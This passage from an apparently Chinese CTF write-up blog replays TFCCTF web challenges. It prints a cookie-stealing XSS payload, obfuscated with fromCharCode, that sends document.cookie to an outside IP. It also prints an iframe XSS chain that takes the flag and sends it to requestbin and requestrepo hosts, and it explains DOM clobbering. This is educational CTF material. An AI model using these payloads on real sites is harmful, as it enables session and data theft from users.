+<p>windows环境复现无法正常运行bot，换在linux下就拿到flag了<br>不过有了<code>KISSFIXESSPlus</code><br>Plus在过滤了更多  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banned = [&quot;s&quot;, &quot;l&quot;, &quot;(&quot;, &quot;)&quot;, &quot;self&quot;, &quot;_&quot;, &quot;.&quot;, &quot;\&quot;&quot;, &quot;\\&quot;, &quot;&amp;&quot;, &quot;%&quot;, &quot;^&quot;, &quot;#&quot;, &quot;@&quot;, &quot;!&quot;, &quot;*&quot;, &quot;-&quot;, &quot;import&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;os&quot;, &quot;;&quot;, &quot;,&quot;, &quot;|&quot;, &quot;JAVASCRIPT&quot;, &quot;window&quot;, &quot;atob&quot;, &quot;btoa&quot;, &quot;=&quot;]</span><br></pre></td></tr></table></figure></div>
+<p>%被过滤了() 还能怎么绕过呢？  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;banned[1]&#125;Script$&#123;banned[2]&#125;new Function$&#123;banned[3]&#125;decodeURIComponent$&#123;banned[3]&#125;String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`77`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`69`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6e`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`64`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6f`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`77`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`2e`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6c`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6f`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`63`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`61`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`74`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`69`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6f`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6e`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`3d`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`22`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`68`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`74`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`74`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`70`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`3a`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`2f`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`2f`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`31`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`32`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`30`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`2e`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`37`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`36`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`2e`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`31`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`39`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`34`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`2e`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`32`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`35`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`3a`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`32`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`33`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`32`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`33`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`3f`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`61`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`3d`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`22`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`2b`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`64`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6f`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`63`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`75`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6d`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`65`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6e`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`74`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`2e`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`63`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6f`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6f`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`6b`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`69`+String[`fromCharCode`]$&#123;banned[3]&#125;37$&#123;banned[4]&#125;+`65`$&#123;banned[4]&#125;$&#123;banned[4]&#125;$&#123;banned[3]&#125;$&#123;banned[4]&#125;$&#123;banned[1]&#125;/Script$&#123;banned[2]&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h3 id="webless"><a href="#webless" class="headerlink" title="webless"></a>webless</h3><p>看了一下，味道很熟悉，还是xss<br>这个路由</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post/&lt;int:post_id&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_page</span>(<span class="params">post_id</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Render a single post fully server-side (no client JS) with strict CSP.&quot;&quot;&quot;</span></span><br><span class="line">    post = <span class="built_in">next</span>((p <span class="keyword">for</span> p <span class="keyword">in</span> posts <span class="keyword">if</span> p[<span class="string">&quot;id&quot;</span>] == post_id), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> post:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Post not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">if</span> post.get(<span class="string">&quot;hidden&quot;</span>) <span class="keyword">and</span> post[<span class="string">&quot;author&quot;</span>] != session[<span class="string">&quot;username&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span>, <span class="number">403</span></span><br><span class="line"></span><br><span class="line">    resp = make_response(render_template(<span class="string">&quot;post.html&quot;</span>, post=post))</span><br><span class="line">    resp.headers[<span class="string">&quot;Content-Security-Policy&quot;</span>] = <span class="string">&quot;script-src &#x27;none&#x27;; style-src &#x27;self&#x27;&quot;</span><span class="comment">#保护很严格呢应该怎么办呢，CSS打？</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></div>
+<p>禁止一切内联脚本<br>还有哪里能打xss呢？<br>注意，很特意的一个设计<br>登录时密码错误也能导致xss,且没有安全头  </p>
+<p>我看看怎么回事</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> username <span class="keyword">and</span> password:</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username] == password:</span><br><span class="line">            session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;invalid.html&quot;</span>, user=username), <span class="number">401</span></span><br></pre></td></tr></table></figure></div>
+<p>牛<br><a href="./TFCCTF-web-replay/11.png"></a><br>直接干了<br>但是没那么简单打因为bot会先登录进flag账户，session中已经有了username无法绕过这个  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;index&quot;</span>))</span><br><span class="line"></span><br><span class="line">    username = request.args.get(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> request.form.get(<span class="string">&quot;username&quot;</span>)</span><br><span class="line">    password = request.args.get(<span class="string">&quot;password&quot;</span>) <span class="keyword">or</span> request.form.get(<span class="string">&quot;password&quot;</span>)</span><br></pre></td></tr></table></figure></div>
+<p>看看大佬怎么做的<br>用了一个做中介还是用到了&#x2F;post&#x2F;xx</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/post/0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:0;height:0;border:0;visibility:hidden&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">a</span>=<span class="string">&quot;wait&quot;</span> <span class="attr">src</span>=<span class="string">/</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">credentialless</span> <span class="attr">src</span>=<span class="string">&quot;/login?username=%3Cscript%3E%0Aconst%20parent%20%3D%20window%2Eparent%3B%0Aconst%20iframe%20%3D%20parent%2Edocument%2EgetElementById%28%27flag%27%29%3B%0Aconst%20iframeDoc%20%3D%20iframe%2EcontentDocument%3B%0Aconst%20flag%20%3D%20iframeDoc%2EgetElementById%28%27description%27%29%2EinnerText%3B%0Afetch%28%27http%3A%2F%2Frequestbin.cn:80/u76c50u7%3Fflag%3D%27%2Bflag%29%0A%3C%2Fscript%3E&amp;password=admin&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:0;height:0;border:0;visibility:hidden&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p><a href="./TFCCTF-web-replay/12.png"></a><br>这个上面去打xss  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">const</span> parent = <span class="variable language_">window</span>.<span class="property">parent</span>;</span><br><span class="line"><span class="keyword">const</span> iframe = parent.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> iframeDoc = iframe.<span class="property">contentDocument</span>;</span><br><span class="line"><span class="keyword">const</span> flag = iframeDoc.<span class="title function_">getElementById</span>(<span class="string">&#x27;description&#x27;</span>).<span class="property">innerText</span>;</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;https://kws1oh3y.requestrepo.com/?flag=&#x27;</span>+flag)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>
+<p>这道题偷cookie没用的，session不存储密码，就也登不进去<br>所以这样打可获取父域dom<br>这种方式很类似于之前老外的有一道比赛<br>确实不太懂，看能不能复现一下吧<br>再report一下<br><a href="./TFCCTF-web-replay/13.png"></a><br>cool~<br>这道题能学到不少xss好活</p>
+<h3 id="DOM-NOTIFY"><a href="#DOM-NOTIFY" class="headerlink" title="DOM NOTIFY"></a>DOM NOTIFY</h3><p><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/dom-based/dom-clobbering">好货1</a><br><a target="_blank" rel="noopener" href="https://jorianwoltjer.com/blog/p/research/mutation-xss">好货2</a><br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219089#h2-3https://xz.aliyun.com/news/6017">好货3</a><br>看不懂多看几遍吧  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOM clobbering(打击) is a technique in which you inject HTML into a page to manipulate(操作) the DOM and ultimately change the behavior of JavaScript on the page</span><br></pre></td></tr></table></figure></div>
+<p>适用于什么场景呢？  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAINTEXT"><figure class="iseeu highlight /plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOM clobbering is particularly useful in cases where XSS is not possible, but you can control some HTML on a page where the attributes id or name are whitelisted by the HTML filter</span><br></pre></td></tr></table></figure></div>
+<p>即<code>id or name are whitelisted by the HTML filter  </code><br>第一篇文章翻译过来就是<br>所有具有 id 或 name 属性的HTML元素，都会被自动变成全局变量（挂在 window 对象上）。<br>如果一个元素有 name 属性，它还会成为其父级“破坏对象”的一个属性。  </p>
+<p>看一下这道题的dompurify函数</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sanitizeContent</span>(<span class="params">content</span>) &#123;</span><br><span class="line">    <span class="comment">// Sanitize the note with DOMPurify</span></span><br><span class="line">    content = <span class="title class_">DOMPurify</span>.<span class="title function_">sanitize</span>(content, &#123;</span><br><span class="line">        <span class="attr">ALLOWED_TAGS</span>: [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;em&#x27;</span>, <span class="string">&#x27;strong&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;div&#x27;</span>, <span class="string">&#x27;span&#x27;</span>],</span><br><span class="line">        <span class="attr">ALLOWED_ATTR</span>: [<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;href&#x27;</span>, <span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Make sure that no empty strings are left in the attributes values</span></span><br><span class="line">    content = content.<span class="title function_">replace</span>(<span class="regexp">/&quot;&quot;/g</span>, <span class="string">&#x27;invalid-value&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>发现dom-clobbering是被允许的<br>再看看main.js文件  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JAVASCRIPT"><figure class="iseeu highlight /javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// window.custom_elements.enabled = true;</span></span><br><span class="line"><span class="keyword">const</span> endpoint = <span class="variable language_">window</span>.<span class="property">custom_elements</span>.<span class="property">endpoint</span> || <span class="string">&#x27;/custom-divs&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchCustomElements</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Fetching elements&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> <span class="title function_">fetch</span>(endpoint);</span><br><span class="line">    <span class="keyword">if</span> (!response.<span class="property">ok</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">`HTTP error! status: <span class="subst">$&#123;response.status&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> customElements = <span class="keyword">await</span> response.<span class="title function_">json</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Custom Elements fetched:&#x27;</span>, customElements);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> customElements;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createElements</span>(<span class="params">elements</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Registering elements&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> element <span class="keyword">of</span> elements) &#123;</span><br><span class="line">        <span class="comment">// Registers a custom element</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(element)</span><br><span class="line">        customElements.<span class="title function_">define</span>(element.<span class="property">name</span>, <span class="keyword">class</span> <span class="title class_">extends</span> <span class="title class_">HTMLDivElement</span> &#123;</span><br><span class="line">            <span class="keyword">static</span> <span class="keyword">get</span> <span class="title function_">observedAttributes</span>() &#123; </span><br><span class="line">                <span class="keyword">if</span> (element.<span class="property">observedAttribute</span>.<span class="title function_">includes</span>(<span class="string">&#x27;-&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> [element.<span class="property">observedAttribute</span>]; </span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> [];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_">attributeChangedCallback</span>(<span class="params">name, oldValue, newValue</span>) &#123;</span><br><span class="line">                <span class="comment">// Log when attribute is changed</span></span><br><span class="line">                <span class="built_in">eval</span>(<span class="string">`console.log(&#x27;Old value: <span class="subst">$&#123;oldValue&#125;</span>&#x27;, &#x27;New Value: <span class="subst">$&#123;newValue&#125;</span>&#x27;)`</span>)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, &#123; <span class="attr">extends</span>: <span class="string">&#x27;div&#x27;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// When the DOM is loaded</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> enabled = <span class="variable language_">window</span>.<span class="property">custom_elements</span>.<span class="property">enabled</span> || <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Check if the custom div functionality is enabled</span></span><br><span class="line">    <span class="keyword">if</span> (enabled) &#123;</span><br><span class="line">        <span class="keyword">var</span> customDivs = <span class="keyword">await</span> <span class="title function_">fetchCustomElements</span>();</span><br><span class="line">        <span class="title function_">createElements</span>(customDivs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></div>
+<p>可以通过dom-clobbering修改全局变量，按照它这个逻辑从外部网站获得数据<br>再阅读一下第二篇文章<br> Mutation XSS (突变XSS)<br>关于突变XSS前几个月坐牢时好像使劲搜了下，没看懂，这下原汁原味读一下<br>真的建议读老外写的()<br>浏览器的 HTML 解析器（parser）和 Sanitizer 用的解析器可能有 差异。<br>这类利用“解析器不一致”导致的 XSS，叫 Mutation XSS（突变型 XSS）<br>对于这道题,就不着急写不懂的WP了，打算再学一篇突变xss</p>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>膜拜SU的web组，干这么多题解了，菜鸡只能出签到</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">h0me</a></li>
+        
+          <li><a href="/categories">Categ0r1es</a></li>
+        
+          <li><a href="/archives/">Artic1es</a></li>
+        
+          <li><a href="/links/">L1nks</a></li>
+        
+          <li><a href="/search/">Searh</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Slippy"><span class="toc-number">1.</span> <span class="toc-text">Slippy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#KISSFIXESS"><span class="toc-number">2.</span> <span class="toc-text">KISSFIXESS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webless"><span class="toc-number">3.</span> <span class="toc-text">webless</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-NOTIFY"><span class="toc-number">4.</span> <span class="toc-text">DOM NOTIFY</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&text=TFCCTF-web-replay"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&title=TFCCTF-web-replay"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&is_video=false&description=TFCCTF-web-replay"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=TFCCTF-web-replay&body=Check out this article: https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&title=TFCCTF-web-replay"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&title=TFCCTF-web-replay"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&title=TFCCTF-web-replay"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hexo.sheep-sys-sudo.top/TFCCTF-web-replay/&title=TFCCTF-web-replay"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
